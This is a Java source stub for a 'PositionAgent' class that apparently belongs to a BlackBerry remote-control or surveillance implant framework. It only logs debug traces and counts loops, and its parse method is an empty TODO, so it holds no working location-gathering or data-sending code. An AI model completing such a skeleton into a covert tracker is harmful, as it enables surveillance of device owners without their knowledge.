package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class PositionAgent extends Agent {
    //#debug
    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);

    public PositionAgent(boolean agentStatus) {
        super(AGENT_POSITION, agentStatus, true, "PositionAgent");
        setEvery(1000);
    }

    protected PositionAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    int loop = 0;

    public void actualRun() {
        // #debug
        debug.trace("run");

        // #debug
        debug.trace("loop:" + loop);
        ++loop;

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
